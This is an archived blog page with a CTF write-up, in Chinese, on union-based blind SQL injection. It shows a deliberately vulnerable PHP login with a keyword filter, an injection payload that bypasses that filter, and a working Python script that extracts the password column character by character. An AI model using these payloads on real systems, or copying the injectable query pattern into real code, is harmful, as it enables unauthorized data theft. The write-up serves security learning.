@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+
+<html lang="zh-cn">
+<head>
+<title>基于union查询的盲注(感谢pcat牛不吝赐教) | wonderkun's|blog</title>
+<link href="./基于union查询的盲注(感谢pcat牛不吝赐教)  wonderkun'sblog/style.css" rel="stylesheet"/>
+<link href="./基于union查询的盲注(感谢pcat牛不吝赐教)  wonderkun'sblog/style.opacity.css" rel="stylesheet"/>
+<link href="./基于union查询的盲注(感谢pcat牛不吝赐教)  wonderkun'sblog/11" rel="profile">
+<link href="http://wonderkun.cc/index.html/xmlrpc.php" rel="pingback">
+<link href="" rel="shortcut icon" type="image/x-icon"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible"/>
+<meta content="dimpurr" name="author"/>
+<meta content="wonderkun's|blog" name="application-name"/>
+<meta charset="utf-8"/>
+<link href="./基于union查询的盲注(感谢pcat牛不吝赐教)  wonderkun'sblog/index.html" rel="home"/>
+<link href="./基于union查询的盲注(感谢pcat牛不吝赐教)  wonderkun'sblog/feed=rss2" rel="alternate" title="RSS 2.0" type="application/rss+xml"/>
+<link href="./基于union查询的盲注(感谢pcat牛不吝赐教)  wonderkun'sblog/feed=rss" rel="alternate" title="RSS 1.0" type="application/rdf+xml"/>
+<link href="./基于union查询的盲注(感谢pcat牛不吝赐教)  wonderkun'sblog/feed=atom" rel="alternate" title="ATOM 1.0" type="application/atom+xml"/>
+<!--[if lt IE 9]>
+<script src="http://wonderkun.cc/index.html/wp-content/themes/clearision/js/html5.js" type="text/javascript"></script>
+<![endif]-->
+<link href="./基于union查询的盲注(感谢pcat牛不吝赐教)  wonderkun'sblog/feed=rss2&amp;p=547" rel="alternate" title="wonderkun's|blog » 基于union查询的盲注(感谢pcat牛不吝赐教)评论Feed" type="application/rss+xml"/>
+<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/72x72\/","ext":".png","source":{"concatemoji":"http:\/\/wonderkun.cc\/index.html\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.5.9"}};
+			!function(a,b,c){function d(a){var c,d,e,f=b.createElement("canvas"),g=f.getContext&&f.getContext("2d"),h=String.fromCharCode;if(!g||!g.fillText)return!1;switch(g.textBaseline="top",g.font="600 32px Arial",a){case"flag":return g.fillText(h(55356,56806,55356,56826),0,0),f.toDataURL().length>3e3;case"diversity":return g.fillText(h(55356,57221),0,0),c=g.getImageData(16,16,1,1).data,d=c[0]+","+c[1]+","+c[2]+","+c[3],g.fillText(h(55356,57221,55356,57343),0,0),c=g.getImageData(16,16,1,1).data,e=c[0]+","+c[1]+","+c[2]+","+c[3],d!==e;case"simple":return g.fillText(h(55357,56835),0,0),0!==g.getImageData(16,16,1,1).data[0];case"unicode8":return g.fillText(h(55356,57135),0,0),0!==g.getImageData(16,16,1,1).data[0]}return!1}function e(a){var c=b.createElement("script");c.src=a,c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g,h,i;for(i=Array("simple","flag","unicode8","diversity"),c.supports={everything:!0,everythingExceptFlag:!0},h=0;h<i.length;h++)c.supports[i[h]]=d(i[h]),c.supports.everything=c.supports.everything&&c.supports[i[h]],"flag"!==i[h]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[i[h]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+<link href="./基于union查询的盲注(感谢pcat牛不吝赐教)  wonderkun'sblog/rest_route=" rel="https://api.w.org/"/>
+<link href="http://wonderkun.cc/index.html/xmlrpc.php?rsd" rel="EditURI" title="RSD" type="application/rsd+xml"/>
+<link href="./基于union查询的盲注(感谢pcat牛不吝赐教)  wonderkun'sblog/wlwmanifest.xml" rel="wlwmanifest" type="application/wlwmanifest+xml"/>
+<link href="./基于union查询的盲注(感谢pcat牛不吝赐教)  wonderkun'sblog/p=524" rel="prev" title="从七个字符长度的任意命令执行到GetShell"/>
+<link href="./基于union查询的盲注(感谢pcat牛不吝赐教)  wonderkun'sblog/p=557" rel="next" title="php写入配置文件的经典漏洞"/>
+<meta content="WordPress 4.5.9" name="generator"/>
+<link href="./基于union查询的盲注(感谢pcat牛不吝赐教)  wonderkun'sblog/p=547" rel="canonical"/>
+<link href="./基于union查询的盲注(感谢pcat牛不吝赐教)  wonderkun'sblog/p=547" rel="shortlink"/>
+<link href="./基于union查询的盲注(感谢pcat牛不吝赐教)  wonderkun'sblog/rest_route=%2Foembed%2F1.0%2Fembed&amp;url=http%3A%2F%2Fwonderkun.cc%2Findex.html%2F%3Fp%3D547" rel="alternate" type="application/json+oembed"/>
+<link href="./基于union查询的盲注(感谢pcat牛不吝赐教)  wonderkun'sblog/rest_route=%2Foembed%2F1.0%2Fembed&amp;url=http%3A%2F%2Fwonderkun.cc%2Findex.html%2F%3Fp%3D547&amp;format=xml" rel="alternate" type="text/xml+oembed"/>
+<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
+<style id="syntaxhighlighteranchor" type="text/css"></style>
+</link></link></head>
+<body class="single single-post postid-547 single-format-standard">
+<div id="page">
+<hgroup id="ctn_header">
+<div id="title">
+<h1 id="site-title"><span><a href="http://wonderkun.cc/index.html/" rel="home" title="wonderkun's|blog">wonderkun's|blog</a></span></h1>
+<h2 id="site-description">share with you!!</h2>
+</div>
+<div id="title_r">
+<a href="http://wonderkun.cc" target="_blank" title="个人页"><button class="tr_profile"></button></a>
+<a href="http://user.qzone.qq.com/729173164" target="_blank" title="QQ"><button class="tr_qqw"></button></a>
+<a href="http://github.com/wonderkun" target="_blank" title="Github"><button class="tr_github"></button></a>
+<a href="http://wonderkun.cc/index.html/?feed=rss2" target="_blank"><button id="tr_rss"></button></a>
+<a href="http://wonderkun.cc/index.html/wp-admin/" target="_blank"><button id="tr_admin"></button></a>
+<span id="tr_clear"></span>
+<form action="http://wonderkun.cc/index.html/" id="tr_s_f" method="get">
+<input id="s" name="s" placeholder="" size="10" type="text"/>
+</form>
+</div>
+<div class="clearfix"></div>
+</hgroup>
+<div id="float">
+<a href="http://wonderkun.cc/index.html/" rel="home" title="wonderkun's|blog"><img alt="wonderkun's|blog" id="logo" src="./基于union查询的盲注(感谢pcat牛不吝赐教)  wonderkun'sblog/09451H922-11.jpg" title="wonderkun's|blog"/></a>
+<nav id="nav" role="navigation">
+<div class="menu-%e4%b8%bb%e8%8f%9c%e5%8d%95-container"><ul class="menu" id="menu-%e4%b8%bb%e8%8f%9c%e5%8d%95"><li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-18" id="menu-item-18"><a href="http://wonderkun.cc/index.html/?cat=1">hack_ctf</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-19" id="menu-item-19"><a href="http://wonderkun.cc/index.html/?cat=6">linux</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-20" id="menu-item-20"><a href="http://wonderkun.cc/index.html/?cat=7">代码控</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-21" id="menu-item-21"><a href="http://wonderkun.cc/index.html/?cat=8">技术宅</a></li>
+</ul></div></nav>
+<nav id="next" role="sencond_navigation">
+<div class="menu-%e8%be%85%e5%8a%a9%e8%8f%9c%e5%8d%95-container"><ul class="menu" id="menu-%e8%be%85%e5%8a%a9%e8%8f%9c%e5%8d%95"><li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-23" id="menu-item-23"><a href="http://wonderkun.cc/index.html/?cat=9">名站推荐</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-24" id="menu-item-24"><a href="http://wonderkun.cc/index.html/?cat=10">我们的故事</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-25" id="menu-item-25"><a href="http://wonderkun.cc/index.html/?cat=11">技术共享</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-26" id="menu-item-26"><a href="http://wonderkun.cc/index.html/?cat=12">资源分享</a></li>
+</ul></div></nav>
+</div>
+<div id="ctn">
+<div id="content">
+<article class="post_ctn">
+<hgroup class="post_hctn">
+<div class="post_time">
+<div class="post_t_d">02/26</div>
+<div class="post_t_u">18:19</div>
+</div>
+<div class="post_h_l">
+<span class="post_ct"><a href="http://wonderkun.cc/index.html/?cat=1" rel="category">hack_ctf</a></span>
+<h2 class="post_h"><a href="http://wonderkun.cc/index.html/?p=547">基于union查询的盲注(感谢pcat牛不吝赐教)</a></h2>
+<div class="post_tag">
+<span class="post_c"><a class="wp-postviews">wonderkun 撰写</a></span>
+<span class="post_c"><a href="http://wonderkun.cc/index.html/?p=547#respond">无回复</a></span>
+<span class="post_c"></span>
+</div>
+</div>
+</hgroup>
+<div class="post_t"><h3>代码如下:</h3>
+<pre class="brush: php; title: ; notranslate" title="">
+&lt;?php
+  $dbhost = "localhost";
+  $dbuser = "root";
+  $dbpass = "123456";
+  $db = "ctf";
+  $conn = mysqli_connect($dbhost,$dbuser,$dbpass,$db);
+  mysqli_set_charset($conn,"utf8");
+
+  /* sql
+
+     create  table `admin` (
+        `id` int(10) not null primary key auto_increment,
+        `username` varchar(20) not null ,
+        `password` varchar(32) not null
+     );
+  */
+function   filter($str){
+      $filterlist = "/\(|\)|username|password|where|
+      case|when|like|regexp|into|limit|=|for|;/";
+      if(preg_match($filterlist,strtolower($str))){
+        die("illegal input!");
+      }
+      return $str;
+  }
+$username = isset($_POST['username'])?
+filter($_POST['username']):die("please input username!");
+$password = isset($_POST['password'])?
+filter($_POST['password']):die("please input password!");
+$sql = "select * from admin where  username =
+ '$username' and password = '$password' ";
+
+$res = $conn -&gt; query($sql);
+if($res-&gt;num_rows&gt;0){
+  $row = $res -&gt; fetch_assoc();
+  if($row['id']){
+     echo $row['username'];
+  }
+}else{
+   echo "The content in the password column is the flag!";
+}
+
+?&gt;
+</pre>
+<p>题目说 password的字段的值,就是flag.那就要想办法读取password的内容</p>
+<p>但是题目的过滤规则还是比较坑的:</p>
+<pre class="brush: php; title: ; notranslate" title="">
+$filterlist = "/\(|\)|username|password|where|
+case|when|like|regexp|into|limit|=|for|;/";
+</pre>
+<p>这些字符都不能出现,限制的比较坑的有一下两条:<br/>
+1. 没有了括号,标志着没有办法用mysql里的函数了.<br/>
+2. 没有了password,但是它却是字段名,所以sql语句中不能出现password这个列名</p>
+<p>想搞明白,先看下面两个sql语句<br/>
+<img alt="" src="./基于union查询的盲注(感谢pcat牛不吝赐教)  wonderkun'sblog/1.png"><br/>
+mysql的字符串排序操作是从前往后一一用ascii码比对的.我们可以利用这个特性,来进行注入.</img></p>
+<pre class="brush: sql; title: ; notranslate" title="">
+select * from ctf.admin  where username = 'admin'  union
+distinct  select 1,2,0x38 order by 3 desc ;
+</pre>
+<p>我们可以控制后面的那个查询的第三个字段,让他从最小开始变化,当查询结果第一条返回的username字段是2的时候,我们就知道这个字符的ascii码减一就是跟数据库中的相等.所以就可以一位一位的猜出来password字段了.</p>
+<p>但是在操作之前,我们需要先得到数据库中的用户名,这个简单</p>
+<pre class="brush: plain; title: ; notranslate" title="">
+只需要提交: username='^1^1#&amp;password=1
+</pre>
+<p>就可以看到一个用户名了.<br/>
+python的poc如下</p>
+<pre class="brush: python; title: ; notranslate" title="">
+#!/usr/bin/python
+# coding:utf-8
+
+import requests
+
+def makeStr(begin,end):
+    str=""
+    for i in range(begin,end):
+        str+=chr(i)
+    return str
+def getPassword():
+    url="http://127.0.0.1/web200/index.php"
+    testStr = makeStr(48,127)
+    username = "admin' union distinct select 1,2,0x{hex} order by 3 desc#"
+    flag = ""
+    for  _  in range(32):
+        for i in testStr:
+            data = {"username":username.format(hex=(flag+i).encode('hex')),"password":'1'}
+            res = requests.post(url,data)
+            if "admin" not in res.text:
+                flag= flag+chr(ord(i)-1)
+                print flag
+                break
+            else:
+                print "[*]",i
+
+if __name__== '__main__':
+    getPassword()
+</pre>
+<p>但是这里有个bug,因为mysql不区分大小写,他认为 D与d相等的,所以最后跑出来的,全是大写的:<br/>
+<img alt="" src="./基于union查询的盲注(感谢pcat牛不吝赐教)  wonderkun'sblog/2.png"/></p>
+<p>不过这样无所谓了,一般数据库中存储的MD5值都是小写,如果实在不行,就爆破一下,反正也不多.</p>
+</div>
+<nav id="post_nav">
+<span id="p_n_l"><a href="http://wonderkun.cc/index.html/?p=524" rel="prev">← 从七个字符长度的任意命令执行到GetShell</a></span>
+<span id="p_n_r"><a href="http://wonderkun.cc/index.html/?p=557" rel="next">php写入配置文件的经典漏洞 →</a></span>
+</nav>
+<div class="cmt" id="cmt">
+<div class="comment-respond" id="respond">
+<h3 class="comment-reply-title" id="reply-title"> <small><a href="/index.html/?p=547#respond" id="cancel-comment-reply-link" rel="nofollow" style="display:none;">撤销评论</a></small></h3> <form action="http://wonderkun.cc/index.html/wp-comments-post.php" class="comment-form" id="cmt_form" method="post">
+<p class="comment-form-comment"><textarea aria-required="true" cols="45" id="comment" name="comment" required="" rows="8"></textarea></p><div id="cmt_form_meta"><input id="author" name="author" placeholder="称呼" required="required" type="text" value=""/>
+<input id="email" name="email" placeholder="邮箱" required="required" type="email" value=""/>
+<input id="url" name="url" placeholder="站点" type="text" value=""/></div>
+<p class="form-submit"><input class="submit" id="cmt_submit" name="submit" type="submit" value="提交"/> <input id="comment_post_ID" name="comment_post_ID" type="hidden" value="547"/>
+<input id="comment_parent" name="comment_parent" type="hidden" value="0"/>
+</p><p style="display: none;"><input id="akismet_comment_nonce" name="akismet_comment_nonce" type="hidden" value="4f10cf0a9e"/></p><p style="display: none;"><input id="ak_js" name="ak_js" type="hidden" value="149"/></p> </form>
+</div><!-- #respond -->
+</div>
+</article>
+</div>
+</div>
+<div id="sidebar">
+<div class="widget" id="one">
+<h2>近期评论</h2><ul id="recentcomments"><li class="recentcomments"><span class="comment-author-link">wonderkun</span>发表在《<a href="http://wonderkun.cc/index.html/?p=585#comment-783">php的随机数的安全性分析</a>》</li><li class="recentcomments"><span class="comment-author-link"><a class="url" href="http://aa" rel="external nofollow">wddee</a></span>发表在《<a href="http://wonderkun.cc/index.html/?p=585#comment-777">php的随机数的安全性分析</a>》</li><li class="recentcomments"><span class="comment-author-link">wonderkun</span>发表在《<a href="http://wonderkun.cc/index.html/?p=585#comment-774">php的随机数的安全性分析</a>》</li><li class="recentcomments"><span class="comment-author-link"><a class="url" href="http://aa" rel="external nofollow">wddee</a></span>发表在《<a href="http://wonderkun.cc/index.html/?p=585#comment-773">php的随机数的安全性分析</a>》</li><li class="recentcomments"><span class="comment-author-link"><a class="url" href="http://rxefekalasu.com" rel="external nofollow">Amberly</a></span>发表在《<a href="http://wonderkun.cc/index.html/?p=585#comment-733">php的随机数的安全性分析</a>》</li><li class="recentcomments"><span class="comment-author-link">wonderkun</span>发表在《<a href="http://wonderkun.cc/index.html/?p=585#comment-724">php的随机数的安全性分析</a>》</li></ul><h2>友情链接</h2>
+<ul class="xoxo blogroll">
+<li><a href="http://www.bendawang.site" target="_blank">Bendawang</a></li>
+<li><a href="http://www.bertramc.cn/" target="_blank">berTrAM</a></li>
+<li><a href="http://www.cnblogs.com/iamstudy/">l3m0n</a></li>
+<li><a href="http://www.ifuryst.com/" target="_blank">墨麒麟安全实验</a></li>
+<li><a href="http://xiaomange.meximas.com/" rel="me" target="_blank">老博客地址</a></li>
+</ul>
+<h2>好基友</h2>
+<ul class="xoxo blogroll">
+<li><a href="http://bear2.cn/" rel="friend colleague" target="_blank">pierre94</a></li>
+<li><a href="http://range.pw" rel="friend met colleague co-resident" target="_blank">range</a></li>
+<li><a href="http://www.yibeizifd.cc/%20%20" target="_blank">yibeizifd</a></li>
+<li><a href="http://yichin.url.ph/" rel="friend colleague" target="_blank">yichin</a></li>
+</ul>
+</div>
+<div class="widget" id="two">
+</div>
+<div class="clearfix"></div>
+</div><footer id="footer" role="contentinfo">
+<a href="http://dimpurr.com" title="Dimpurr (钉子)">Dimpurr</a>'s 
+<a href="http://blog.dimpurr.com/clearision" title="Clearision">Clearision</a><br/>
+Powered by <a href="http://wordpress.org/" title="WordPress">WordPress</a>
+<script src="./基于union查询的盲注(感谢pcat牛不吝赐教)  wonderkun'sblog/script.js" type="text/javascript"></script>
+<script src="./基于union查询的盲注(感谢pcat牛不吝赐教)  wonderkun'sblog/form.jsver=3.1.10" type="text/javascript"></script>
+<script src="./基于union查询的盲注(感谢pcat牛不吝赐教)  wonderkun'sblog/shCore.jsver=3.0.9b" type="text/javascript"></script>
+<script src="./基于union查询的盲注(感谢pcat牛不吝赐教)  wonderkun'sblog/shBrushPhp.jsver=3.0.9b" type="text/javascript"></script>
+<script src="./基于union查询的盲注(感谢pcat牛不吝赐教)  wonderkun'sblog/shBrushSql.jsver=3.0.9b" type="text/javascript"></script>
+<script src="./基于union查询的盲注(感谢pcat牛不吝赐教)  wonderkun'sblog/shBrushPlain.jsver=3.0.9b" type="text/javascript"></script>
+<script src="./基于union查询的盲注(感谢pcat牛不吝赐教)  wonderkun'sblog/shBrushPython.jsver=3.0.9b" type="text/javascript"></script>
+<script type="text/javascript">
+	(function(){
+		var corecss = document.createElement('link');
+		var themecss = document.createElement('link');
+		var corecssurl = "http://wonderkun.cc/index.html/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shCore.css?ver=3.0.9b";
+		if ( corecss.setAttribute ) {
+				corecss.setAttribute( "rel", "stylesheet" );
+				corecss.setAttribute( "type", "text/css" );
+				corecss.setAttribute( "href", corecssurl );
+		} else {
+				corecss.rel = "stylesheet";
+				corecss.href = corecssurl;
+		}
+		document.getElementsByTagName("head")[0].insertBefore( corecss, document.getElementById("syntaxhighlighteranchor") );
+		var themecssurl = "http://wonderkun.cc/index.html/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shThemeRDark.css?ver=3.0.9b";
+		if ( themecss.setAttribute ) {
+				themecss.setAttribute( "rel", "stylesheet" );
+				themecss.setAttribute( "type", "text/css" );
+				themecss.setAttribute( "href", themecssurl );
+		} else {
+				themecss.rel = "stylesheet";
+				themecss.href = themecssurl;
+		}
+		//document.getElementById("syntaxhighlighteranchor").appendChild(themecss);
+		document.getElementsByTagName("head")[0].insertBefore( themecss, document.getElementById("syntaxhighlighteranchor") );
+	})();
+	SyntaxHighlighter.config.strings.expandSource = '+ expand source';
+	SyntaxHighlighter.config.strings.help = '帮助';
+	SyntaxHighlighter.config.strings.alert = 'SyntaxHighlighter\n\n';
+	SyntaxHighlighter.config.strings.noBrush = '无法找到Brush：';
+	SyntaxHighlighter.config.strings.brushNotHtmlScript = 'Brush不能设置 html-script选项';
+	SyntaxHighlighter.defaults['light'] = true;
+	SyntaxHighlighter.defaults['pad-line-numbers'] = 3;
+	SyntaxHighlighter.defaults['toolbar'] = false;
+	SyntaxHighlighter.all();
+</script>
+<script src="./基于union查询的盲注(感谢pcat牛不吝赐教)  wonderkun'sblog/wp-embed.min.jsver=4.5.9" type="text/javascript"></script>
+</footer>
+</div>
+</body>
+</html>
